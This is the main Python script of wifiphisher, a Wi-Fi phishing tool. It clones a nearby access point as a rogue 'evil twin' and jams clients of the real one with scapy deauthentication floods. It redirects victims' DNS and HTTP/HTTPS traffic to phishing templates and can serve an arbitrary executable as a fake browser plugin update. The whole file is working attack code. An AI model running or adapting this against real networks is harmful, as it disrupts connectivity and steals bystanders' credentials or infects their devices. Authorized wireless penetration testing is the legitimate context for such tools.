#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import re
import time
import sys
import argparse
import fcntl
from threading import Thread, Lock
from subprocess import Popen, PIPE, check_output
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from shutil import copyfile
import phishingpage
import phishinghttp
import interfaces
from constants import *

conf.verb = 0
count = 0  # for channel hopping Thread
APs = {} # for listing APs
clients_APs = []
hop_daemon_running = True
terminate = False
lock = Lock()
args = 0
mon_MAC = 0

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-c",
        "--channel",
        help="Choose the channel for monitoring. Default is channel 1",
        default="1"
    )
    parser.add_argument(
        "-s",
        "--skip",
        help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA"
    )
    parser.add_argument(
        "-jI",
        "--jamminginterface",
        help=("Choose monitor mode interface. " +
              "By default script will find the most powerful interface and " +
              "starts monitor mode on it. Example: -jI mon5"
              )
    )
    parser.add_argument(
        "-aI",
        "--apinterface",
        help=("Choose access point interface. " +
              "By default script will find the most powerful interface and " +
              "starts an access point on it. Example: -aI wlan0"
              )
    )
    parser.add_argument(
        "-m",
        "--maximum",
        help=("Choose the maximum number of clients to deauth." +
              "List of clients will be emptied and repopulated after" +
              "hitting the limit. Example: -m 5"
              )
    )
    parser.add_argument(
        "-n",
        "--noupdate",
        help=("Do not clear the deauth list when the maximum (-m) number" +
              "of client/AP combos is reached. Must be used in conjunction" +
              "with -m. Example: -m 10 -n"
              ),
        action='store_true'
    )
    parser.add_argument(
        "-t",
        "--timeinterval",
        help=("Choose the time interval between packets being sent." +
              " Default is as fast as possible. If you see scapy " +
              "errors like 'no buffer space' try: -t .00001"
              )
    )
    parser.add_argument(
        "-p",
        "--packets",
        help=("Choose the number of packets to send in each deauth burst. " +
              "Default value is 1; 1 packet to the client and 1 packet to " +
              "the AP. Send 2 deauth packets to the client and 2 deauth " +
              "packets to the AP: -p 2"
              )
    )
    parser.add_argument(
        "-d",
        "--directedonly",
        help=("Skip the deauthentication packets to the broadcast address of" +
              "the access points and only send them to client/AP pairs"
              ),
        action='store_true')
    parser.add_argument(
        "-a",
        "--accesspoint",
        help="Enter the MAC address of a specific access point to target"
    )

    parser.add_argument(
        "-T",
        "--template",
        help=("Choose the template to run."+
              "Using this option will skip the interactive "+
              "selection"))

    parser.add_argument(
        "-pK",
        "--presharedkey",
        help=("Add WPA/WPA2 protection on the rogue Access Point"))

    return parser.parse_args()

def check_args(args):
    if args.presharedkey and \
    (len(args.presharedkey) < 8 \
    or len(args.presharedkey) > 64):
        sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')

def shutdown(wireless_interfaces=None):
    """
    Shutdowns program.
    """
    os.system('iptables -F')
    os.system('iptables -X')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -X')
    os.system('pkill airbase-ng')
    os.system('pkill dnsmasq')
    os.system('pkill hostapd')
    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
        os.remove('/tmp/wifiphisher-webserver.tmp')
    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
        os.remove('/tmp/wifiphisher-jammer.tmp')
    if os.path.isfile('/tmp/hostapd.conf'):
        os.remove('/tmp/hostapd.conf')
    if os.path.isfile('/tmp/wifiphisher-hostapd.log'):
        os.remove('/tmp/wifiphisher-hostapd.log')

    # set all the used interfaces to managed (normal) mode and show any errors
    if wireless_interfaces:
        network_manager = interfaces.NetworkManager(None, None)
        for interface in wireless_interfaces:
            try:
                network_manager.set_interface_mode(interface, "managed")
            except (interfaces.IfconfigCmdError,
                    interfaces.IwconfigCmdError) as err:
                print err

    print '\n[' + R + '!' + W + '] Closing'
    sys.exit(0)


def channel_hop(mon_iface):
    chan = 0
    while hop_daemon_running:
        try:
            if chan > 11:
                chan = 0
            chan = chan + 1
            channel = str(chan)
            iw = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', channel],
                stdout=DN, stderr=PIPE
            )
            for line in iw.communicate()[1].split('\n'):
                # iw dev shouldnt display output unless there's an error
                if len(line) > 2:
                    with lock:
                        err = (
                            '[' + R + '-' + W + '] Channel hopping failed: ' +
                            R + line + W + '\n'
                            'Try disconnecting the monitor mode\'s parent' +
                            'interface (e.g. wlan0)\n'
                            'from the network if you have not already\n'
                        )
                        sys.exit(err)
                    break
            time.sleep(1)
        except KeyboardInterrupt:
            sys.exit()


def sniffing(interface, cb):
    '''This exists for if/when I get deauth working
    so that it's easy to call sniff() in a thread'''
    sniff(iface=interface, prn=cb, store=0)


def targeting_cb(pkt):
    global APs, count
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            ap_channel = str(ord(pkt[Dot11Elt:3].info))
        except Exception:
            return
        essid = pkt[Dot11Elt].info
        mac = pkt[Dot11].addr2
        if len(APs) > 0:
            for num in APs:
                if essid in APs[num][1]:
                    return
        count += 1
        APs[count] = [ap_channel, essid, mac]
        target_APs()


def target_APs():
    global APs, count
    os.system('clear')
    print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' +
           ' point from below')
    print 'num  ch   ESSID'
    print '---------------'
    for ap in APs:
        print (G + str(ap).ljust(2) + W + ' - ' + APs[ap][0].ljust(2) + ' - ' +
               T + APs[ap][1] + W)


def copy_AP():
    global APs, count
    copy = None
    while not copy:
        try:
            copy = raw_input(
                ('\n[' + G + '+' + W + '] Choose the [' + G + 'num' + W +
                 '] of the AP you wish to copy: ')
            )
            copy = int(copy)
        except Exception:
            copy = None
            continue
    try:
        channel = APs[copy][0]
        essid = APs[copy][1]
        if str(essid) == "\x00":
            essid = ' '
        mac = APs[copy][2]
        return channel, essid, mac
    except KeyError:
        return copy_AP()


def select_template(template_argument):
    """
    Select a template based on whether the template argument is set or not. If
    the template argument is not set, it will interactively ask user for a
    template.

    Args:
        template_argument (str): The template argument which might have been
                                 entered by the user.

    Returns:
        (PhishingTemplate): A PhishingTemplate object.

    Raises:
        InvalidTemplate: In case the template argument entered by the user is
                         not available.
    """

    # create a template manager object
    template_manager = phishingpage.TemplateManager()

    # get all available templates
    templates = template_manager.get_templates()

    # get all the templates names for display
    template_names = list(templates.keys())

    # check if the template argument is set and is correct
    if template_argument and template_argument in templates:
        # return the template name
        return templates[template_argument]
    elif template_argument and template_argument not in templates:
        # in case of an invalid template
        raise phishingpage.InvalidTemplate
    else:
        # loop until all operations for template selection is done
        while True:
            # clear the screen
            os.system('clear')

            # display template header
            print "\nAvailable Phishing Scenarios:\n"

            # display the templates
            for number in range(len(template_names)):
                print (G + str(number + 1) + W + " - " +
                       str(templates[template_names[number]]))

            # get user's choice
            choosen_template = raw_input("\n[" + G + "+" + W +
                                         "] Choose the [" + G + "num" + W +
                                         "] of the scenario you wish to use: ")

            # placed to avoid a program crash in case of non integer input
            try:
                template_number = int(choosen_template)
            except ValueError:
                print "\n[" + R + "-" + W + "] Please input an integer."

                # start from the beginning
                continue

            if template_number not in range(1, len(template_names) + 1):
                print ("\n[" + R + "-" + W + "] Wrong input number! please" +
                       " try again")

                # start from the beginning
                continue

            # remove 1 from template number which was added for display reasons
            template_number -= 1

            # return the chosen template
            return templates[template_names[template_number]]


def start_ap(mon_iface, channel, essid, args):
    print '[' + T + '*' + W + '] Starting the fake access point...'
    config = (
        'interface=%s\n'
        'driver=nl80211\n'
        'ssid=%s\n'
        'hw_mode=g\n'
        'channel=%s\n'
        'macaddr_acl=0\n'
        'ignore_broadcast_ssid=0\n'
    )
    if args.presharedkey:
        config += (
            'wpa=2\n'
            'wpa_passphrase=%s\n'
        ) % args.presharedkey

    with open('/tmp/hostapd.conf', 'w') as dhcpconf:
            dhcpconf.write(config % (mon_iface, essid, channel))

    Popen(['hostapd', '/tmp/hostapd.conf', '-f', '/tmp/wifiphisher-hostapd.log'], stdout=DN, stderr=DN)
    try:
        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
        proc = check_output(['cat', '/tmp/wifiphisher-hostapd.log'])
        if 'driver initialization failed' in proc:
            print('[' + R + '+' + W +
                  '] Driver initialization failed! (hostapd error)\n' +
                  '[' + R + '+' + W +
                  '] Try a different wireless interface using -aI option.'
                  )
            shutdown()
    except KeyboardInterrupt:
        shutdown()


def dhcp_conf(interface):

    config = (
        'no-resolv\n'
        'interface=%s\n'
        'dhcp-range=%s\n'
        'address=/#/%s'
    )

    with open('/tmp/dhcpd.conf', 'w') as dhcpconf:
        dhcpconf.write(config % (interface, DHCP_LEASE, NETWORK_GW_IP))
    return '/tmp/dhcpd.conf'


def dhcp(dhcpconf, mon_iface):
    dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
    Popen(['ifconfig', str(mon_iface), 'mtu', '1400'], stdout=DN, stderr=DN)
    Popen(
        ['ifconfig', str(mon_iface), 'up', NETWORK_GW_IP,
         'netmask', NETWORK_MASK
         ],
        stdout=DN,
        stderr=DN
    )
    # Give it some time to avoid "SIOCADDRT: Network is unreachable"
    time.sleep(.5)
    # Make sure that we have set the network properly.
    proc = check_output(['ifconfig', str(mon_iface)])
    if NETWORK_GW_IP not in proc:
        return False
    os.system(
        ('route add -net %s netmask %s gw %s' %
         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
    )
    return True


# Wifi Jammer stuff
# TODO: Merge this with the other channel_hop method.
def channel_hop2(mon_iface):
    '''
    First time it runs through the channels it stays on each channel for
    5 seconds in order to populate the deauth list nicely.
    After that it goes as fast as it can
    '''
    global monchannel, first_pass, args

    channelNum = 0

    while 1:
        if args.channel:
            with lock:
                monchannel = args.channel
        else:
            channelNum += 1
            if channelNum > 11:
                channelNum = 1
                with lock:
                    first_pass = 0
            with lock:
                monchannel = str(channelNum)

            proc = Popen(
                ['iw', 'dev', mon_iface, 'set', 'channel', monchannel],
                stdout=DN,
                stderr=PIPE
            )

            for line in proc.communicate()[1].split('\n'):
                if len(line) > 2:
                    # iw dev shouldnt display output unless there's an error
                    err = ('[' + R + '-' + W + '] Channel hopping failed: '
                           + R + line + W)
                    sys.exit(err)

        output(monchannel)
        if args.channel:
            time.sleep(.05)
        else:
            # For the first channel hop thru, do not deauth
            if first_pass == 1:
                time.sleep(1)
                continue

        deauth(monchannel)


def deauth(monchannel):
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway
    if there's multi-APs to one gateway. Constantly scans the clients_APs list
    and starts a thread to deauth each instance
    '''

    global clients_APs, APs, args

    pkts = []

    if len(clients_APs) > 0:
        with lock:
            for x in clients_APs:
                client = x[0]
                ap = x[1]
                ch = x[2]
                '''
                Can't add a RadioTap() layer as the first layer or it's a
                malformed Association request packet?
                Append the packets to a new list so we don't have to hog the
                lock type=0, subtype=12?
                '''
                if ch == monchannel:
                    deauth_pkt1 = Dot11(
                        addr1=client,
                        addr2=ap,
                        addr3=ap) / Dot11Deauth()
                    deauth_pkt2 = Dot11(
                        addr1=ap,
                        addr2=client,
                        addr3=client) / Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    pkts.append(deauth_pkt2)
    if len(APs) > 0:
        if not args.directedonly:
            with lock:
                for a in APs:
                    ap = a[0]
                    ch = a[1]
                    if ch == monchannel:
                        deauth_ap = Dot11(
                            addr1='ff:ff:ff:ff:ff:ff',
                            addr2=ap,
                            addr3=ap) / Dot11Deauth()
                        pkts.append(deauth_ap)

    if len(pkts) > 0:
        # prevent 'no buffer space' scapy error http://goo.gl/6YuJbI
        if not args.timeinterval:
            args.timeinterval = 0
        if not args.packets:
            args.packets = 1

        for p in pkts:
            send(p, inter=float(args.timeinterval), count=int(args.packets))


def output(monchannel):
    global clients_APs, APs, args
    wifi_jammer_tmp = "/tmp/wifiphisher-jammer.tmp"
    with open(wifi_jammer_tmp, "a+") as log_file:
        log_file.truncate()
        with lock:
            for ca in clients_APs:
                if len(ca) > 3:
                    log_file.write(
                        ('[' + T + '*' + W + '] ' + O + ca[0] + W +
                         ' - ' + O + ca[1] + W + ' - ' + ca[2].ljust(2) +
                         ' - ' + T + ca[3] + W + '\n')
                    )
                else:
                    log_file.write(
                        '[' + T + '*' + W + '] ' + O + ca[0] + W +
                        ' - ' + O + ca[1] + W + ' - ' + ca[2] + W + '\n'
                    )
        with lock:
            for ap in APs:
                log_file.write(
                    '[' + T + '*' + W + '] ' + O + ap[0] + W +
                    ' - ' + ap[1].ljust(2) + ' - ' + T + ap[2] + W + '\n'
                )
        # print ''


def noise_filter(skip, addr1, addr2):
    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast,
    # broadcast
    ignore = [
        'ff:ff:ff:ff:ff:ff',
        '00:00:00:00:00:00',
        '33:33:00:', '33:33:ff:',
        '01:80:c2:00:00:00',
        '01:00:5e:',
        mon_MAC
    ]
    if skip:
        ignore.append(skip)
    for i in ignore:
        if i in addr1 or i in addr2:
            return True


def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    global clients_APs, APs, args

    # return these if's keeping clients_APs the same or just reset clients_APs?
    # I like the idea of the tool repopulating the variable more
    if args.maximum:
        if args.noupdate:
            if len(clients_APs) > int(args.maximum):
                return
        else:
            if len(clients_APs) > int(args.maximum):
                with lock:
                    clients_APs = []
                    APs = []

    '''
    We're adding the AP and channel to the deauth list at time of creation
    rather than updating on the fly in order to avoid costly for loops
    that require a lock.
    '''

    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:

            # Filter out all other APs and clients if asked
            if args.accesspoint:
                if args.accesspoint not in [pkt.addr1, pkt.addr2]:
                    return

            # Check if it's added to our AP list
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                APs_add(clients_APs, APs, pkt, args.channel)

            # Ignore all the noisy packets like spanning tree
            if noise_filter(args.skip, pkt.addr1, pkt.addr2):
                return

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt.addr1, pkt.addr2)


def APs_add(clients_APs, APs, pkt, chan_arg):
    ssid = pkt[Dot11Elt].info
    bssid = pkt[Dot11].addr3
    try:
        # Thanks to airoscapy for below
        ap_channel = str(ord(pkt[Dot11Elt:3].info))
        # Prevent 5GHz APs from being thrown into the mix
        chans = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11']
        if ap_channel not in chans:
            return

        if chan_arg:
            if ap_channel != chan_arg:
                return

    except Exception:
        return

    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])


def clients_APs_add(clients_APs, addr1, addr2):

    if len(clients_APs) == 0:
        if len(APs) == 0:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])
        else:
            AP_check(addr1, addr2)

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if addr1 in ca and addr2 in ca:
                return

        if len(APs) > 0:
            return AP_check(addr1, addr2)
        else:
            with lock:
                return clients_APs.append([addr1, addr2, monchannel])


def AP_check(addr1, addr2):
    for ap in APs:
        if ap[0].lower() in addr1.lower() or ap[0].lower() in addr2.lower():
            with lock:
                return clients_APs.append([addr1, addr2, ap[1], ap[2]])


def mon_mac(mon_iface):
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
    mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    print ('[' + G + '*' + W + '] Monitor mode: ' + G
           + mon_iface + W + ' - ' + O + mac + W)
    return mac


def sniff_dot11(mon_iface):
    """
    We need this here to run it from a thread.
    """
    sniff(iface=mon_iface, store=0, prn=cb)

def get_dnsmasq():
    if not os.path.isfile('/usr/sbin/dnsmasq'):
        install = raw_input(
            ('[' + T + '*' + W + '] dnsmasq not found ' +
             'in /usr/bin/dnsmasq, install now? [y/n] ')
        )
        if install == 'y':
            if os.path.isfile('/usr/bin/pacman'):
                os.system('pacman -S dnsmasq')
            elif os.path.isfile('/usr/bin/yum'):
                os.system('yum install dnsmasq')
            else:
                os.system('apt-get -y install dnsmasq')
        else:
            sys.exit(('[' + R + '-' + W + '] dnsmasq' +
                     ' not found in /usr/sbin/dnsmasq'))
    if not os.path.isfile('/usr/sbin/dnsmasq'):
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to install the \'dnsmasq\' package!\n' +
            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
            '[' + G + '+' + W + '] Rerun the script to install dnsmasq.\n' +
            '[' + R + '!' + W + '] Closing'
         ))

def get_hostapd():
    if not os.path.isfile('/usr/sbin/hostapd'):
        install = raw_input(
            ('[' + T + '*' + W + '] hostapd not found ' +
             'in /usr/sbin/hostapd, install now? [y/n] ')
        )
        if install == 'y':
            if os.path.isfile('/usr/bin/pacman'):
                os.system('pacman -S hostapd')
            elif os.path.isfile('/usr/bin/yum'):
                os.system('yum install hostapd')
            else:
                os.system('apt-get -y install hostapd')
        else:
            sys.exit(('[' + R + '-' + W + '] hostapd' +
                     ' not found in /usr/sbin/hostapd'))
    if not os.path.isfile('/usr/sbin/hostapd'):
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to install the \'hostapd\' package!\n' +
            '[' + T + '*' + W + '] This process requires a persistent internet connection!\n' +
            'Please follow the link below to configure your sources.list\n' +
            B + 'http://docs.kali.org/general-use/kali-linux-sources-list-repositories\n' + W +
            '[' + G + '+' + W + '] Run apt-get update for changes to take effect.\n' +
            '[' + G + '+' + W + '] Rerun the script to install hostapd.\n' +
            '[' + R + '!' + W + '] Closing'
         ))

def run():

    print "               _  __ _       _     _     _               "
    print "              (_)/ _(_)     | |   (_)   | |              "
    print "     __      ___| |_ _ _ __ | |__  _ ___| |__   ___ _ __ "
    print "     \ \ /\ / / |  _| | '_ \| '_ \| / __| '_ \ / _ \ '__|"
    print "      \ V  V /| | | | | |_) | | | | \__ \ | | |  __/ |   "
    print "       \_/\_/ |_|_| |_| .__/|_| |_|_|___/_| |_|\___|_|   "
    print "                      | |                                "
    print "                      |_|                                "
    print "                                                         "

    # Initialize a list to store the used interfaces
    used_interfaces = list()

    # Parse args
    global args, APs, clients_APs, mon_MAC
    args = parse_args()

    # Check args
    check_args(args)

    # Are you root?
    if os.geteuid():
        sys.exit('[' + R + '-' + W + '] Please run as root')

    # Get hostapd if needed
    get_hostapd()

    # Get dnsmasq if needed
    get_dnsmasq()

    # TODO: We should have more checks here:
    # Is anything binded to our HTTP(S) ports?
    # Maybe we should save current iptables rules somewhere

    network_manager = interfaces.NetworkManager(args.jamminginterface,
                                                args.apinterface)

    # get interfaces for monitor mode and AP mode and set the monitor interface
    # to monitor mode. shutdown on any errors
    try:
        mon_iface, ap_iface = network_manager.get_interfaces()
        # TODO: this line should be removed once all the wj_iface have been
        # removed
        wj_iface = mon_iface

        # display selected interfaces to the user
        print ("\n[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "\
               "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "\
               "rogue access point").format(G, W, mon_iface, ap_iface)

        # set monitor mode to monitor interface
        network_manager.set_interface_mode(mon_iface, "monitor")
    except (interfaces.NotEnoughInterfacesFoundError,
            interfaces.JammingInterfaceInvalidError,
            interfaces.ApInterfaceInvalidError,
            interfaces.NoApInterfaceFoundError,
            interfaces.NoMonitorInterfaceFoundError, interfaces.IwCmdError,
            interfaces.IwconfigCmdError, interfaces.IfconfigCmdError) as err:
        print ("[{0}!{1}] " + str(err)).format(R, W)
        shutdown()

    # add the selected interfaces to the used list
    used_interfaces = [mon_iface, ap_iface]

    # Set iptable rules and kernel variables.
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, PORT))
    )
    os.system(
        ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
         % (NETWORK_GW_IP, SSL_PORT))
    )
    Popen(
        ['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'],
        stdout=DN,
        stderr=PIPE
    )

    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'

    # Copy AP
    time.sleep(3)
    hop = Thread(target=channel_hop, args=(mon_iface,))
    hop.daemon = True
    hop.start()
    sniffing(mon_iface, targeting_cb)
    channel, essid, ap_mac = copy_AP()
    hop_daemon_running = False

    # get the correct template
    template = select_template(args.template)

    print ("[" + G + "+" + W + "] Selecting " + template.get_display_name() +
           " template")

    # payload selection for browser plugin update
    if "Browser Plugin Update" in template.get_display_name():

        # get payload path
        payload_path = raw_input("\n[" + G + "+" + W +
                                     "] Enter the [" + G + "full path" + W +
                                     "] to the payload you wish to serve: ")

        # copy payload to update directory

        while not os.path.isfile(payload_path):

            print "Invalid file path"

            payload_path = raw_input("\n[" + G + "+" + W +
                                     "] Enter the [" + G + "full path" + W +
                                     "] to the payload you wish to serve: ")

        print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '

        copyfile(payload_path, PHISHING_PAGES_DIR + '/plugin_update/update/update.exe')


    # set the path for the template
    phishinghttp.set_template_path(template.get_path())

    # Kill any possible programs that may interfere with the wireless card
    # Only for systems with airmon-ng installed
    if os.path.isfile('/usr/sbin/airmon-ng'):
        proc = Popen(['airmon-ng', 'check', 'kill'], stdout=PIPE, stderr=DN)
    # Start AP
    start_ap(ap_iface, channel, essid, args)
    dhcpconf = dhcp_conf(ap_iface)
    if not dhcp(dhcpconf, ap_iface):
        print('[' + G + '+' + W +
              '] Could not set IP address on %s!' % ap_iface
              )
        shutdown()
    os.system('clear')
    print ('[' + T + '*' + W + '] ' + T +
           essid + W + ' set up on channel ' +
           T + channel + W + ' via ' + T + mon_iface +
           W + ' on ' + T + str(ap_iface) + W)

    # With configured DHCP, we may now start the web server
    # Start HTTP server in a background thread
    Handler = phishinghttp.HTTPRequestHandler
    try:
        httpd = phishinghttp.HTTPServer((NETWORK_GW_IP, PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
    webserver = Thread(target=httpd.serve_forever)
    webserver.daemon = True
    webserver.start()
    # Start HTTPS server in a background thread
    Handler = phishinghttp.SecureHTTPRequestHandler
    try:
        httpd = phishinghttp.SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
    except socket.error, v:
        errno = v[0]
        sys.exit((
            '\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' +
            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' +
            '[' + R + '!' + W + '] Closing'
        ))
    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
           str(SSL_PORT))
    secure_webserver = Thread(target=httpd.serve_forever)
    secure_webserver.daemon = True
    secure_webserver.start()

    time.sleep(3)

    clients_APs = []
    APs = []
    args.accesspoint = ap_mac
    args.channel = channel
    monitor_on = None
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    first_pass = 1

    monchannel = channel
    # Start channel hopping
    hop = Thread(target=channel_hop2, args=(wj_iface,))
    hop.daemon = True
    hop.start()

    # Start sniffing
    sniff_thread = Thread(target=sniff_dot11, args=(wj_iface,))
    sniff_thread.daemon = True
    sniff_thread.start()

    # Main loop.
    try:
        while 1:
            os.system("clear")
            print "Jamming devices: "
            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            print "DHCP Leases: "
            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            print "HTTP requests: "
            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
                proc = check_output(['cat', '/tmp/wifiphisher-webserver.tmp'])
                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
            else:
                lines = "\n" * LINES_OUTPUT
            print lines
            if phishinghttp.terminate:
                time.sleep(3)
                shutdown(used_interfaces)
            time.sleep(0.5)
    except KeyboardInterrupt:
        shutdown(used_interfaces)
